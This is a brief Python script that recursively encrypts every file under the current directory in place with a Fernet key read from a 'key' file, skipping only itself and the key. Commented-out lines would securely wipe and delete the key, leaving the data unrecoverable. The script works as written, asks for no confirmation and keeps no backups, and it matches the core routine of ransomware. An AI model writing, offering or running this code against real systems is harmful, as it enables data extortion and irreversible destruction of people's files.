import os
import shutil
from cryptography.fernet import Fernet

# Read the encryption key from the 'key' file
with open('key', 'rb') as key_file:
    encryption_key = key_file.read()

# Remove the 'key' file
# os.remove('key')

# Create an instance of the encryption cipher
cipher = Fernet(encryption_key)

# Get the current directory
current_directory = os.getcwd()

# Iterate over all files in the directory
for root, dirs, files in os.walk(current_directory):
    for file in files:
        # Exclude the script file and key file (if they exist) from encryption
        if file != 'encrypt_files.py' and file != 'key':
            file_path = os.path.join(root, file)

            # Read the file content
            with open(file_path, 'rb') as input_file:
                content = input_file.read()

            # Encrypt the file content
            encrypted_content = cipher.encrypt(content)

            # Write the encrypted content back to the file
            with open(file_path, 'wb') as output_file:
                output_file.write(encrypted_content)

# Optionally, you can delete the 'key' file securely by overwriting its content before removing it
# with open('key', 'wb') as key_file:
#     key_file.write(os.urandom(len(encryption_key)))
# os.remove('key')
